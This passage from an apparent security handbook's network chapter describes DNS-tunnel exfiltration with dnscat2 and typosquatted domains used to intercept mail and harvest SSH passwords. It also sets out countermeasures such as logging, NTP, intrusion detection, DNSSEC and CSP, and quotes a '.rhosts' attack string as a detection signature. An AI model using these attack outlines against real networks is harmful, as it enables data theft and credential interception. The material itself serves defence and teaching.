    ;; Received 46 bytes from 216.239.32.10#53(ns1.google.com) in 307 ms

When following through the above process, you can see that, although the egress may be very restricted, the DNS will just about always make it to the authoritative name server(s).

The most flexible and useful type of DNS record for the attacker is the `TXT` record. We discuss the DNS `TXT` record briefly in the [EMail Address Spoofing Countermeasures](#network-countermeasures-spoofing-email-address) subsection. The `TXT` record is very flexible, and useful for transferring arbitrary data, including code, and commands (see section 3.3.14. `TXT RDATA` format of the [specification](https://www.ietf.org/rfc/rfc1035.txt)), which can also be modified at any point along its travels. There is no specific limit on the number of text strings in a  `TXT RDATA` field, but the TXT-DATA can not exceed 65535 bytes (general restriction on all records) in total. Each text string cannot exceed 255 characters in length including the length byte octet of each. This provides plenty of flexibility for the attacker.

The evolution of data exfiltration and infiltration started with [OzymanDNS](https://room362.com/post/2009/2009310ozymandns-tunneling-ssh-over-dns-html/) from Dan Kaminsky in 2004. Shortly after that, Tadeusz Pietraszek created [DNScat](http://tadek.pietraszek.org/projects/DNScat/), providing bi-directional communications through DNS servers. DNScat took the netcat idea and applied it to DNS, allowing penetration testers and attackers alike to pass through firewalls unhindered. DNScat is written in Java, requiring the JVM to be installed. Ron Bowes created the successor called [dnscat2](https://github.com/iagox86/dnscat2), you can check the history of dnscat2 on the github [history section](https://github.com/iagox86/dnscat2#history).

In order to carry out a successful Exfil, the attacker will need:

1. A domain name registered for this attack
2. A payload they can drop on one to many hosts inside their target network.
The [dnscat2 client](https://github.com/iagox86/dnscat2#client) is written in C, modifications can and should be made to the source to help avoid detection.
Dnscat2 also provides the ability to tunnel SSH from the dnscat2 server (C2) to the dnscat2 client, and even to other machines on the same network. All details are provided on the dnscat2 [github](https://github.com/iagox86/dnscat2#tunnels), and even more details are provided on [Ron's blog](https://blog.skullsecurity.org/2015/dnscat2-0-05-with-tunnels). Once the attacker has modified the client source, they will most likely run it through [VirusTotal](https://www.virustotal.com/) or a similar service to attempt to verify the likelihood of the payload being detected. We have covered quite a few techniques for increasing the chances of getting the payload onto the target systems in the [PowerShell](#vps-identify-risks-powershell) subsections of the VPS chapter, and the Infectious Media subsections of the People chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/).
3. A command and control (C2) server configured as the domain's authoritative name server that is capable of communicating with the executing payload(s) on the hosts inside the target's network. [izhan](https://github.com/izhan) created a [howto document](https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md) covering the authoritative name server set-up. dnscat2 was created for this very reason.

All the documentation required to set-up the C2 server and client is provided by dnscat2.

### Doppelganger Domains {#network-identify-risks-doppelganger-domains}

Often domain consumers (people: sending emails, browsing websites, SSHing, etc) mistype the domain. The most common errors are leaving '.' out between the domain and sub domain or using incorrect country suffixes. Attackers can take advantage of this by purchasing the mistyped domains. This allows them to intercept requests with: credentials, email and other sensitive information that comes their way by unsuspecting domain consumers.

#### Web-sites {#network-identify-risks-doppelganger-domains-websites}
![](images/ThreatTags/easy-common-average-moderate.png)

These are useful for victimising users via a spoofed web-site and social engineering. The attacker may not be able to spoof the DNS entries, although this is the next best thing. For example `accountsgoogle.co.nz` could look reasonably legitimate for a New Zealand user intending to sign into their legitimate google account at `accounts.google.com`. In fact, at the time of writing, this domain is available. Using the methods described in the Website section to clone and host a site and convince someone to browse to it with a doppelganger domain like this is reasonably easy.

![](images/accountsgoogle-available0.jpg)

![](images/accountsgoogle-available1.jpg)

#### SMTP {#network-identify-risks-doppelganger-domains-smtp}
![](images/ThreatTags/average-common-difficult-moderate.png)

1. Purchasing the doppelganger (mistyped) domains
2. Configuring the mail exchanger (MX) record
3. Setting up an SMTP server to catch all
    1. record
    2. modify the to address to the legitimate address
    3. modify the from address to the doppelganger domain that the attacker owns (thus also intercepting the mail replies)
    4. forward (essentially MItM).

The attacker gleans a lot of potentially sensitive information.

#### SSH {#network-identify-risks-doppelganger-domains-ssh}
![](images/ThreatTags/average-common-difficult-severe.png)

This attack pattern usually sees less traffic, but if/when compromised, potentially leads to much larger gains. You do not get better than shell access, especially if they have not disallowed root, as discussed in the VPS chapter under [Hardening SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-sshd_config).

Setup the DNS A record value to be the IP address of the attacker's SSH server and the left most part of the name to be "*", so that all possible substitutions that do not exist (not just absent any matching records) will receive the attacker's SSH server IP address. DNS wild-card rules are complicated.

An SSH server needs to be set up to record the user-names and passwords. The OpenSSH code needs to be modified in order to do this.

### Wrongful Trust When Loading Untrusted Web Resources {#network-identify-risks-wrongfully-trusting-the-loading-of-untrusted-web-resources}
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

By default, the browser allows all resources from all locations to be loaded. What would happen if one of those servers was compromised, or an attacker was tampering with the payload, potentially changing what was expected for something malicious to be executed once loaded? This is a very common technique for attackers wishing to get their malicious scripts into your browser.

### TLS Downgrade {#network-identify-risks-tls-downgrade}
![](images/ThreatTags/average-common-average-severe.png)

When ever a user browses to a HTTPS website, there is the potential for an attacker to intercept the request before the TLS handshake is made, and if the web server accepts an unencrypted request, redirect the user to the same website, but without the TLS.

This is a danger for all websites that do not enforce TLS for every page, or better, at the domain level. For example, many websites are run over plain HTTP until the user wants to log in, at which point the browser then issues a request to an HTTPS resource that is listed on an unencrypted page. These requests can easily be intercepted, and the attacker can change the request to HTTP so that the TLS handshake is never made.

[https://httpswatch.nz](https://httpswatch.nz) is an excellent resource for some of the prominent websites in New Zealand, informing them of the issues in regards to HTTPS health.

## 3. SSM Countermeasures {#network-countermeasures}

Revisit the Countermeasures subsection of the first chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).

* [MS Network Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_006)

### Fortress Mentality {#network-countermeasures-fortress-mentality}
![](images/ThreatTags/PreventionAVERAGE.png)

This section takes the concepts from the section of the same name in the Physical chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/).

Once we get past the fact that we are no longer safe behind our firewalls, we can start to progress in realising that our inner components: services, clients, and communications will be attacked, and we need to harden them.

Our largest shortcoming continues to be our people falling victim to common social engineering attacks. I've spoken about this in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/), so please refer to that if you have not already read it.

The organisation needs to decide on and enforce their own policies, just as you do for your own personal devices and network(s).

The organisation could decide to not allow any work devices to be taken from the premises.

Another option is to actually help workers to be more secure with everything in their lives that has the potential to impact the business. What effects the workers impacts the business.

Additionally, a separate wireless network for your visitors and workers to access the Internet is a good improvement.

In terms of technology, most of the VPS chapter was focused on removing services that are not needed, and hardening those that are. Also, understanding that your corporate network is barely any better than being directly on the Internet without a perimeter anyway.

Once you have made sure your listening services are patched, you are only using security-conscious services, and your communications between services are encrypted, then from a technology perspective, you are doing well.

For file and data sharing from machine to machine no matter where they are, and also from software client to service, you can use the likes of Tresorit's offerings:

* [Tresorit](https://tresorit.com/) for encrypted file storage for everyone, with vast configurability
* [Tresorit ZeroKit SDK](https://tresorit.com/zerokit) User authentication and end-to-end encryption for Android, iOS and JavaScript applications

### Lack of Segmentation  {#network-countermeasures-lack-of-segmentation}
![](images/ThreatTags/PreventionAVERAGE.png)

When you create network segments containing only the resources specific to the consumers who you have authorised access to, you are creating an environment of [least privilege](#web-applications-countermeasures-management-of-application-secrets-least-privilege), where only those authorised to access resources can access them.

For example, if you felt it was essential for your kitchen appliances to be able to talk to the Internet, then put them all on a separate network segment, and tightly constrain their privileges.

By segmenting a network, it creates a point of indirection that the attacker has to attempt to navigate passage through. How the gateway is configured dictates how difficult and time consuming it is to traverse.

Network segmentation has the potential to limit damage to the specific segment affected.

PCI-DSS provides guidance on why and how to reduce your compliance scope, much of this comes down to segmenting all card holder data from the rest of the network.

I spoke a little about host firewalls in the VPS chapter. With regard to network firewalls, they play an important role in allowing (white listing) only certain hosts, network segments, ports, protocols, etc. into any given gateway's network interface.

Logging, alerting, and IDS/IPS play an important part in monitoring, providing visibility, and even preventing some network attacks. They were discussed in the context of hosts in the VPS chapter, and similarly apply to networking, we will address these in the next section. 

**Component Placement**

Some examples of how and where you could/should place components:

Servers that need to serve the World Wide Web should be in a demilitarisation zone (DMZ). Your organisation's corporate LAN should only have network access to the DMZ in order to perform administrative activities at the most, via SSH (TCP 22) and possibly HTTPS (TCP 443). It is also a good idea to define which host IP addresses should be allowed traversal from the LAN gateway interface. In some cases even network access is locked down and physical access is the only way to access DMZ resources. The DMZ gateway interface should have rules to only allow what is necessary to another network segment, as discussed briefly in the [VPS chapter](#vps-countermeasures-preparation-for-dmz). For example:

* To data stores if necessary
* For [system updates](#vps-countermeasures-using-components-with-known-vulnerabilities)
* DNS if necessary. Also review the sections on DNS spoofing and Data Exfiltration leveraging DNS later in this chapter
* To a syslog server, [as discussed](#network-countermeasures-lack-of-visibility-insufficient-logging) later in this chapter and also in the [VPS chapter](#vps-countermeasures-lack-of-visibility-logging-and-alerting)
* Access to [time server](#network-countermeasures-fortress-mentality-insufficient-logging-ntp) (NTP)

Consider putting resources such as data stores in a secluded segment, VLAN or physical, but isolate them as much as possible.

Also consider using [Docker containers](#vps-countermeasures-docker), which provide some free isolation.

### Lack of Visibility
![](images/ThreatTags/PreventionAVERAGE.png)

There are quite a few things that can be done to improve visibility on your networks. Let's address logging and Network Intrusion Detection Systems.

#### Insufficient Logging {#network-countermeasures-lack-of-visibility-insufficient-logging}

If you think back to the Web Server Log Management countermeasures section in the VPS chapter, we outlined an [Environmental Considerations](#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations) section, in which I deferred to this section. It made more sense to discuss alternative device system logging such as routers, Layer 3 switches, in some cases layer 2 switches, data stores, and file servers here in the Network chapter rather than under VPS. Let's address that now. 

**Steps in order of dependencies**

![](images/NetworkSysloging.png)

None of these are ideal, as UDP provides no reliable messaging, it's crucial that "no" system log messages are lost, which we can not guarantee with UDP. Also, with some network components, we may not be able to provide confidentiality or integrity of messages over the wire from network appliances that only support UDP without TLS (DTLS), a VPN, or any type of encryption. This means we can no longer rely on our logs to provide the truth. The best case below still falls short in terms of reliability, as the test setup used pfSense, which only supports sending syslogs via UDP. The best you could hope for in this case is that there is not much internal network congestion, or find a router that supports TCP at a minimum.

**Steps with details**

Here we discuss three steps. Each step has a selection of options. You can choose one option from each of the three steps.

1. As per the PaperTrail setup we performed in our test lab
2.    
  * Create persistence of FreeNAS syslogs, currently they are lost on shutdown because FreeNAS runs entirely in RAM
        * Create a dataset called "syslog" on your ZFS zpool and reset.
  * (Option **first choice**, for pfSense)
        * Create a jail in FreeNAS, [install OpenVPN in the jail](https://forums.freenas.org/index.php?threads/how-to-install-openvpn-inside-a-jail-in-freenas-9-2-1-6-with-access-to-remote-hosts-via-nat.22873/), install rsyslogd in the jail and configure it to accept syslog events via UDP as TCP is not supported. Do this from the host and the remote hosts, and forward them on via TCP(possibly with RELP)/TLS to the external syslog aggregator.
  * (Option **second choice**) Receive syslogs from local FreeNAS and other internal appliances that only send using UDP (pfSense in our example lab, Layer 3 (even 2) switches and APs) and possibly some appliances that can send via TCP.
        * Download and run [SyslogAppliance](http://www.syslogappliance.de/en/) which is a turn-key VM for any VMware environment. SyslogAppliance is a purpose built slim Debian instance with [no sshd installed](http://www.syslogappliance.de/download/syslogappliance-0.0.6/README.txt), that can receive syslog messages from many types of appliances, including routers, firewalls, switches, and even Windows event logs via UDP and TCP. SyslogAppliance also [supports TLS](http://www.syslog.org/forum/profile/?area=showposts;u=29) and comes preconfigured with rsyslog and [LogAnalyzer](http://loganalyzer.adiscon.com/), thus providing [log analysis and alerting](http://www.syslogappliance.de/en/features.php). This means step 3 is no longer required, as it is being performed by LogAnalyzer. This option can also store its logs on an iSCSI target from FreeNAS.
  * (Option **third choice**) Receive syslogs from local FreeNAS and other internal appliances that only send using UDP (pfSense in our example lab, and possibly Layer 3 (even 2) switches and APs).
        * The default syslogd in FreeBSD doesn't support TCP.
        * Create a jail in FreeNAS, install rsyslogd in the jail and configure it to accept UDP syslog messages and then forward them on via TCP(possibly with RELP)/TLS.
3.    
  * (Option **first choice** for pfSense) UDP, as TCP is not available.
        * In the pfSense Web UI: Set-up a vpn from site 'a' (syslog sending IP address) to site 'b' (syslog receiving IP address / remote log destination).
        * Then in Status -> System Logs -> Settings -> Remote Logging Options, add the `IP:port` of the listening VPN server, which is hosted in the FreeBSD jail of the rsyslogd server (FreeNAS in this example) into one of the "Remote log servers" input boxes. The other option here is to send to option second choice of step two (SyslogAppliance).
        * Your routing table will take care of the rest.
  * (Option **second choice**)
        * Configure syslog UDP-only appliances to forward their logs to the rsyslogd in the jail (option third choice of step two), or to the second option in step two (SyslogAppliance).
                
There are also a collection of [Additional Resources](#additional-resources-network-insufficient-logging-internal-network-system-logging) worth looking at.

##### Network Time Protocol (NTP) {#network-countermeasures-fortress-mentality-insufficient-logging-ntp}

As we discussed in the VPS chapter under the [Logging and Alerting](#vps-countermeasures-lack-of-visibility-logging-and-alerting) section, being able to correlate the times of events triggered by an attacker's movements throughout your network is essential in auditing and recreating what actually happened.

**Your NTP Server**

With this setup, we have one-too-many Linux servers in a network that all want to be synced with the same up-stream Network Time Protocol (NTP) server(s) that your router (or what ever server you choose to be your NTP authority) uses.

On your router or what ever your NTP server host is, add the NTP server pools. How you do this really depends on what you are using for your NTP server, so I will leave this part out of scope. There are many [NTP pools](https://www.google.ie/search?q=ntp+server+pools) you can choose from. Pick one, or a collection that is as close to your NTP server as possible.

If your NTP daemon is running on your router, you will need to decide and select which router interfaces you want the NTP daemon supplying time to. You almost certainly will not want it on the WAN interface (unless you are a pool member, or the WAN belongs to you) if you have one on your router.

Make sure you restart your NTP daemon.

**Your Client Machines**

There are two NTP packages to discuss.

1. **ntpdate** is a programme that sets the date on a scheduled occurrence via chron, an end user running it manually, or by some other means. Ntpdate has been [deprecated](http://support.ntp.org/bin/view/Dev/DeprecatingNtpdate) for several years now. The functionality that ntpdate offered is now provided by the ntp daemon. Running `ntp -q` will run ntp, set the time and exit as soon as it has. This functionality mimics how ntpdate is used, the upstream NTP server must be specified either in the `/etc/ntp.conf` file or overridden by placing it immeiatly after the `-q` option if running manually. 
2. **ntpd** or just ntp, is a daemon that continuously monitors and updates the system time with an upstream NTP server specified in the local systems  
`/etc/ntp.conf`

**Setting up NTP**

1. This is how it used to be done with ntpdate:  
    
    If you have ntpdate installed, `/etc/default/ntpdate` specifies that the list of NTP servers is taken from `/etc/ntp.conf`, which does not exist without ntp being installed. It looks like this:  
    
    {title="/etc/default/ntpdate", linenos=off, lang=bash}
        # Set to "yes" to take the server list from /etc/ntp.conf, from package ntp,
        # so you only have to keep it in one place.
        NTPDATE_USE_NTP_CONF=yes
    
    You would see that it also has a default `NTPSERVERS` variable set, which is overridden if you add your time server to `/etc/ntp.conf`. If you entered the following and ntpdate is installed:  
    
    {linenos=off, lang=bash}
        dpkg-query -W -f='${Status} ${Version}\n' ntpdate
    
    You would receive output like:  
    
    {linenos=off, lang=bash}
        install ok installed 1:4.2.6.p5+dfsg-3
    
2. This is how it is done with ntp:  
    
    If you enter the following and ntp is installed:
    
    {linenos=off, lang=bash}
        dpkg-query -W -f='${Status} ${Version}\n' ntp
    
    You will receive output such as:  
    
    {linenos=off, lang=bash}
        install ok installed 1:4.2.8p4+dfsg-3
    
    Alternatively run this command for more information on the installed state:  
    
    {linenos=off, lang=bash}
        dpkg-query -l '*ntp*'
        # Will also tell you about ntpdate if it is installed.
    
    If ntp is not installed, install it with:  
    
    {linenos=off, lang=bash}
        sudo apt-get install ntp
    
    You will find that there is no `/etc/default/ntpdate` file installed with ntp.  
    
    The public NTP server(s) can be added straight to the bottom of the `/etc/ntp.conf` file, but because we want to use our own NTP server, we add the IP address of our server that is configured with our NTP pools to the bottom of the file.  
    
    {title="/etc/ntp.conf", linenos=off}
        server <IP address of your local NTP server here>
    
    Now if your NTP daemon is running on your router, hopefully you have everything blocked on its interface(s) by default and are using a whitelist for egress filtering. In this case you will need to add a firewall rule to each interface of the router that you want NTP served up on. NTP talks over UDP and listens on port 123 by default. After any configuration changes to your `ntpd` make sure you restart it. On most routers this is done via the web UI.
    
    On the client (Linux) machines:  
    
    {linenos=off, lang=bash}
        sudo service ntp restart
  
    Now, issuing the date command on your Linux machine will provide the current time with seconds.

**Trouble-shooting**

The main two commands I use are:

{linenos=off, lang=bash}
    sudo ntpq -c lpeer

Which should produce output like:

{linenos=off, lang=bash}
    remote                        refid                 st t when poll reach delay offset jitter
    ============================================================================================
    *<server name>.<domain name> <upstream ntp ip address> 2 u 54  64  77  0.189  16.714  11.589

and the standard [NTP query](http://doc.ntp.org/4.1.0/ntpq.htm) program followed by the `as` argument:

{linenos=off, lang=bash}
    ntpq

This will drop you at the `ntpq` prompt:

{linenos=off, lang=bash}
    ntpq> as

which should produce output such as:

{linenos=off, lang=bash}
    ind assid status  conf reach auth condition  last_event cnt
    ===========================================================
      1 15720  963a   yes   yes  none  sys.peer    sys_peer  3

In the first output, the `*` in front of the remote [means](http://www.pool.ntp.org/en/use.html) the server is getting its time successfully from the upstream NTP server(s), which is imperative in our scenario. Often you may also get a `refid` of `.INIT`. which is one of the “Kiss-o’-Death Codes” which means “The association has not yet synchronized for the first time”. See the [NTP parameters](http://www.iana.org/assignments/ntp-parameters/ntp-parameters.xhtml). I have found that sometimes you just need to be patient here.

In the second output, if you get a condition of `reject`, it is usually because your local ntp can not access the NTP server you set up. Check your firewall rules, etc.

Now check that all the times are in sync with the `date` command.

#### Lack of Network Intrusion Detection Systems (NIDS) {#network-countermeasures-lack-of-visibility-nids}
This is similar to [HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) but acts as a network spy with its network interface (NIC) in promiscuous mode, capturing all traffic crossing the specific network segment that the NIDS is on. Ideally, this occurs before (preventative) it reaches its target. NIDS are usually positioned strategically between a potential attack source and target.

NIDS can be installed with many existing network devices, such as routers, network firewalls, switches, or come out of the box as stand-alone hardware, not consuming any existing hosts resources. HIDS are in most cases reactive, as in the attack has to have already occurred in order to be detected, where as NIDS/NIPS can analyse the network packets before they reach their target, ideally mitigating the attack. All security is a combination of detection, prevention and response. We need to realise that any single one of these is not enough, but all three are required to achieve defence in depth.

**NIDS can operate with Signatures**:

1. String signatures look like known attack strings or sub-strings. "_For example, such a string signature in UNIX can be "cat "+ +" > /.rhosts" , which if executed, can cause the system to become extremely vulnerable to network attack._" 
2. Port: "_Port signatures commonly probes for the connection setup attempts to well known, and frequently attacked ports. Obvious examples include telnet (TCP port 23), FTP (TCP port 21/20), SUNRPC (TCP/UDP port 111), and IMAP (TCP port 143). If these ports aren't being used by the site at a point in time, then the incoming packets directed to these ports are considered suspicious._"
3. Header condition: "_Header signatures are designed to watch for dangerous or illegitimate combinations in packet header fields. The most famous example is Winnuke, in which a packet's port field is NetBIOS port and the Urgent pointer, or Out Of Band pointer is set. In earlier versions of Windows, this resulted in the "blue screen of death". Another well known such header signature is a TCP packet header in which both the SYN and FIN flags are set. This signifies that the requestor is attempting to start and stop a connection simultaneously._"

> Quotes from the excellent [Survey of Current Network Intrusion Detection Techniques](http://www1.cse.wustl.edu/~jain/cse571-07/ftp/ids/index.html)

**NIDS can operate with [Anomalies](http://www1.cse.wustl.edu/~jain/cse571-07/ftp/ids/index.html#sec4)**:

With anomaly detection, a known good state must be established and recorded before the system is able to detect changes to that good state. Similar to file integrity checkers such as [Stealth](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth), the system needs to know what a good state looks like before that good state can be protected. This initial recording of the good state can take time and requires normal operating network traffic without any malicious activity, similar to how we discussed the [preparation for DMZ](#vps-countermeasures-preparation-for-dmz) in the VPS chapter.

**Signature-based pros**:

* Off the shelf patterns can be used to match against
* No learning period for the NIDS required
* Faster to match patterns
* Less false positives
* Easier to set-up/configure

**Signature-based cons**:

* Fails when it comes to zero-day attacks, until the signatures have been provided by analysts
* Often do not stand up well to sophisticated new attacks

**Anomaly-based pros**:

* The system can continue to learn and be taught what new attacks look like. Thus, the system can grow with your needs
* Does not need existing patterns as signature-based detection does
* Can react immediately to zero-day attacks because they do not fit the normal known good state
* Stand a much better chance at standing up to sophisticated new attacks
* Effective at establishing good known state for each protocol stack

**Anomaly-based cons**:

* A learning period is required for the NIDS to establish a good known state of normal non-malicious traffic
* More false positives
* Can be harder to set up/configure

Ideally you will set up NIDS that uses both signature and anomaly based detection.

It is a good idea to have both Host and Network IDS/IPS in place at a minimum. I personally like to have more than one tool doing the same job but with different areas of strength covering the weaker areas of its sibling. An example of this is with HIDS where you might have one HIDS on the system where it is protecting and another somewhere else on the network, or even on another network completely, looking into the host and performing its checks. This makes discoverability difficult for an attacker.

**Some excellent free and open Enterprise grade NIDS**

* [Snort](https://www.snort.org/) is the leader in free and open source NIDS, it's mature with a strong community. Snort can be seen used in many different scenarios. Written in C, and version 3, which is supposed to be multi-threaded, is still [in its third alpha](http://blog.snort.org/2014/12/introducing-snort-30.html). Snort covers both signature and anomaly-based techniques. I've personally used Snort, and found it a joy to work with
* [Bro](https://www.bro.org/) uses its own domain specific language (DSL), it uses anomaly-based detection techniques, and is often used in conjunction with Snort, they complement each other well. Bro has many protocol analysers, and is also often used for forensic analysis
* [Suricata](https://suricata-ids.org/) is a direct competitor with Snort, it's written in C, multi-threaded and is supposed to be faster, but possibly only noticed once throughput of 1 Gbps speeds are [well exceeded](https://forum.pfsense.org/index.php?topic=83548.0). SANS produced an [Open Source IDS Performance Shootout](https://www.sans.org/reading-room/whitepapers/intrusion/open-source-ids-high-performance-shootout-35772) document, which is worth reading if performance is an issue for you. Suricata can be thought of as the next generation Snort
* [Security Onion](https://securityonion.net/) is an Ubuntu based distribution containing intrusion detection, network security monitoring, and log management tools, such as: OSSEC, Snort, Suricata, Bro, netsniff-ng, Sguil, ELSA, Xplico, NetworkMiner, and many others. This allows you to set up a free and open source, enterprise grade network security appliance

%% https://securityonion.net/#about
%% https://github.com/Security-Onion-Solutions/security-onion/wiki/IntroductionToSecurityOnion

%% https://packages.debian.org/wheezy/harden-surveillance

%% http://www.kitploit.com/2015/11/security-onion-linux-distro-for.html
%% http://blog.securityonion.net/p/securityonion.html
%% http://www.sans.org/reading-room/whitepapers/detection/logging-monitoring-detect-network-intrusions-compliance-violations-environment-33985
%% http://www.unixmen.com/security-onion-linux-distro-ids-nsm-log-management/

### Spoofing {#network-countermeasures-spoofing}

The following are a collection of mitigations for the types of network spoofing discussed.

#### IP {#network-countermeasures-spoofing-ip}
![](images/ThreatTags/PreventionDIFFICULT.png)

Filter incoming packets (ingress) that appear to come from an internal IP address at your perimeter.  
Filter outgoing packets (egress) that appear to originate from an invalid local IP address.  
Don't rely on IP source addresses for authentication (AKA trust relationships). I have seen this on quite a few occasions as the sole form of authentication, this is just not good enough as the only means of authentication.

#### ARP (Address Resolution Protocol) {#network-countermeasures-spoofing-arp}
![](images/ThreatTags/PreventionAVERAGE.png)

Use spoofing detection software.  
ARP poisoning is quite noisy, the attacker continually sends [ARP packets](http://en.wikipedia.org/wiki/Address_Resolution_Protocol), IDS can detect and flag it, then an IPS can block it.

Tools such as free and open source [ArpON (ARP handler inspection)](http://arpon.sourceforge.net/) do the whole job, plus a lot more.  
There is also [ArpWatch](http://linux.die.net/man/8/arpwatch), and others.

If you have a decent gateway device, you should be able to install and configure Arpwatch.

#### DNS {#network-countermeasures-spoofing-dns}
![](images/ThreatTags/PreventionAVERAGE.png)

Many cache poisoning attacks can be prevented on DNS servers by trusting less of the information passed on to them by other DNS servers, and by ignoring any DNS records passed back which are not directly relevant to the query.

[DNS Security Extensions](http://www.dnssec.net/) does the following for us. You will probably need to configure it though on your name server(s), I did.

* DNS cache poisoning
* Origin authentication of DNS data
* Data integrity
* Authenticated denial of existence

Make sure your [Name Server](http://www.dnssec.net/software) supports DNSSEC.

#### Referrer {#network-countermeasures-spoofing-referrer}
![](images/ThreatTags/PreventionEASY.png)

Deny all access by default. Require explicit grants to specific roles for access to every function. Implement checks in the controller and possibly the business logic as well (defence in depth). Never trust the simple obfuscation of certain resources that appear to be hidden to prevent user access. 

Check [OWASP Failure to Restrict URL Access](https://www.owasp.org/index.php/Top_10_2007-Failure_to_Restrict_URL_Access) for countermeasures, and the [Guide to Authorisation](https://www.owasp.org/index.php/Guide_to_Authorization).

#### EMail Address {#network-countermeasures-spoofing-email-address}
![](images/ThreatTags/PreventionDIFFICULT.png)

Email spoofing will only work if the victims SMTP server does not perform reverse lookups on the hostname.

Key-pair encryption helps somewhat. The headers can still be spoofed, but the message can not, thus providing secrecy and authenticity:

* GPG/PGP (uses "web of trust" for key-pairs)  
Application Layer  
Used to encrypt an email message body, and any file for that matter, as well as signing.  
Email headers are not encrypted

* S/MIME (uses Certificate Authorities (CAs)(Can be in-house) TLS using PKI)  
Application Layer  
Used to encrypt an email message body, and provide signing  
Email headers are not encrypted

The industry of late is trending towards replacing (same) key pair encryption with Forward Secrecy, where keys change on each exchange.

GPG/PGP and S/MIME are similar concepts. Both allow the consumer to encrypt data inside an email.  
See my detailed post on GPG/PGP [here](http://blog.binarymist.net/2015/01/31/gnupg-key-pair-with-sub-keys/) for more details.

I have noticed some confusion surrounding S/MIME vs TLS.
TLS works at the transport & session layer, as opposed to S/MIME which operates at the Application Layer. The only similarity I can see is that they both use Certificate Authorities.

* Adjust your spam filters
* Read your message headers and trace IP addresses, although any decent self respecting spammer or social engineer is going to be using proxies.
* Do not click links or execute files from unsolicited emails, even if the email appears to be from someone you know. It may not be.
* Make sure your mail provider is using [Domain-based Message Authentication, Reporting and Conformance (DMARC)](http://dmarc.org/)
  * [Sender Policy Framework](https://tools.ietf.org/html/rfc7208) (SPF) is a path-based email authentication technique in which a receiving mail exchange can check that the incoming email originates from a host authorised by the given domain's administrators by way of a specially formatted DNS TXT record
  * [DomainKeys Identified Mail](https://tools.ietf.org/html/rfc6376) (DKIM) is a signature-based email authentication technique which also uses a DNS TXT record, the content of which is the DKIM signature, which is comprised of a set of `tag=value` pairs such as `d=<sending domain>`, `p=<public key>`, and [others](https://tools.ietf.org/html/rfc6376#section-3.2). The receiving mail exchange uses it to validate the end-to-end integrity and source of the email message

#### Website {#network-countermeasures-spoofing-website}
![](images/ThreatTags/PreventionAVERAGE.png)

There is nothing to stop someone cloning and hosting a website. The vital part of driving visitors to an attacker's illegitimate website is to either social engineer them into visit it, or just clone a website that you know they are likely to visit, an Intranet at your workplace for example. Then you will need to carry out ARP and/or DNS spoofing. Again, tools such as free and open source [ArpON (ARP handler inspection)](http://arpon.sourceforge.net/) help protect against website spoofing, and a lot more.

### Data Exfiltration, Infiltration
![](images/ThreatTags/PreventionDIFFICULT.png)

There are so many ways to get data in and out of an organisation's environment.
The following are some of the countermeasures you need to think about when it comes to stopping unauthorised communications entering your network and/or your data leaving your premises, servers or compute resources.

#### Dropbox

The options here are to:

* Closely monitor Dropbox and other file sync tool usage by way of [NI[D|P]S](#network-countermeasures-lack-of-visibility-nids) as we discussed previously in this chapter
* Block Dropbox and other file sync tools entirely at the firewall

Be aware of how attackers think, what is possible and how easy it is. This will help you design your countermeasures.

#### Physical

We discussed this in the Infectious Media subsection of the Countermeasures section in the People chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com/).

#### Mobile Phone Data

You could ask that people do not use their cell phones, or perhaps leave them at reception. You could block the cell phone signals, but in many countries this is [illegal](https://www.fcc.gov/general/jamming-cell-phones-and-gps-equipment-against-law). This is a hard one, do some brain-storming with your colleagues.

#### DNS, SSH

As usual, defence in depth is your best defence.

Basically, just stop as much traffic as possible from leaving the target network. Even so, there are many other ways of getting data in and out of your network.

Run a decent HIDS on vulnerable hosts, [as discussed](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) in the VPS chapter under Lack of Visibility in the Countermeasures subsection. This will let you know if the integrity of any existing files on the vulnerable systems have been compromised, along with any important new files being added or removed.

Run antivirus/antimalware that leverage decent machine learning algorithms, this will increase your chances of detecting malicious payloads that are dropped on vulnerable hosts.

Run a decent NIDS on your network, [as discussed](#network-countermeasures-lack-of-visibility-nids) in the Lack of Visibility subsection of this chapter, which covers both signature-based and anomaly-based analysis and detection.

In most cases, the target's vulnerable hosts will not have a reason to query `TXT` records, especially in the quantity used in DNS tunnelling. Consider blocking them.

### Doppelganger Domains {#network-countermeasures-doppelganger-domains}

Purchase as many doppelganger domains related to your own domain - which makes sense, and what you can afford. Emulate what the attacker might do on your internal DNS server. If you are embracing defence in depth, then your attacker will have a much harder time compromising you.

#### Web-sites {#network-countermeasures-doppelganger-domains-websites}
![](images/ThreatTags/PreventionAVERAGE.png)

Train users to be wary of these things. Just awareness that this is a technique used by attackers is often enough to prevent its success.

#### SMTP {#network-countermeasures-doppelganger-domains-smtp}
![](images/ThreatTags/PreventionAVERAGE.png)

Set-up your own internal catch-all SMTP server to correct mistyped domains before someone else does.

#### SSH {#network-countermeasures-doppelganger-domains-ssh}
![](images/ThreatTags/PreventionAVERAGE.png)

Do not mistype the domain.  
Use [key pair authentication](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication) as discussed, so no passwords are exchanged.

### Wrongful Trust When Loading Untrusted Web Resources {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources}

Consider the likes of [Consuming Free and Open Source](#web-applications-countermeasures-consuming-free-and-open-source) in the Web Applications chapter.

#### Content Security Policy (CSP) {#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp}
![](images/ThreatTags/PreventionEASY.png)

When using CSP, we are providing the browser with a whitelist of allowed types of resources, and from where they are allowed to be loaded.  
We do this by specifying particular response headers (more specifically, directives).

